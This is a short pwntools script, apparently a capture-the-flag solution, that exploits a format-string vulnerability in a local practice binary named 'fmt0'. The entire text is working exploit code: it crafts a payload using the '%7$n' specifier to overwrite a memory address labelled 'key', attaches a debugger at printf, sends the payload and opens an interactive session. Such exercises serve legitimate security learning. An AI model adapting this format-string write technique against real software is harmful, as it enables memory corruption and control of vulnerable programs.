from pwn import *

io = process("./fmt0")

key = 0x0404038
payload = b'aa%7$n' +b'a'*2 + p64(key)

gdb.attach(io, 'b printf')
io.sendafter(b'Input', payload)

io.interactive()